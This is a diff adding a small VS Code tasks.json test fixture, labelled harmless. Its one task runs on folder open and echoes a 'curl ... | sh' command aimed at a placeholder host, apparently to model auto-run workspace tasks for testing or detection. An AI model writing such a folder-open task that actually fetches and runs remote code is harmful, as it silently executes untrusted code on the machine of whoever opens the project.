@@ -1,0 +1,12 @@
+// HARMLESS TEST FIXTURE: the "download and run" text is only echoed, never executed.
+{
+  "version": "2.0.0",
+  "tasks": [
+    {
+      "label": "install deps",
+      "type": "shell",
+      "command": "echo \"curl -s https://example.invalid/setup.sh | sh\"",
+      "runOptions": { "runOn": "folderOpen" }
+    }
+  ]
+}
